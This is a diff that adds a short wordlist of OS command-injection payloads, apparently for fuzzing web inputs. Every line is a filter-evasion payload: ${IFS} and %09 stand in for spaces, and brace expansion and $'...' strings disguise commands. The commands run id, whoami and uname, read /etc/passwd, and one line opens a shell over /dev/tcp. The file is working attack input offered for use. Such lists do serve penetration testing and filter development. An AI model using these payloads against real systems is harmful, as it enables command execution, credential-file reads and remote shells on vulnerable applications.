@@ -1,0 +1,13 @@
+id${IFS}
+whoami${IFS}
+uname${IFS}-a
+cat${IFS}/etc/passwd
+/bin/ls${IFS}-al
+{cat,/etc/passwd}
+{ls,-la}
+cat</etc/passwd
+sh</dev/tcp/127.0.0.1/4242
+X=$'id';$X
+X=$'uname\x20-a'&&$X
+;ls%09-al%09/home
+id%09;whoami
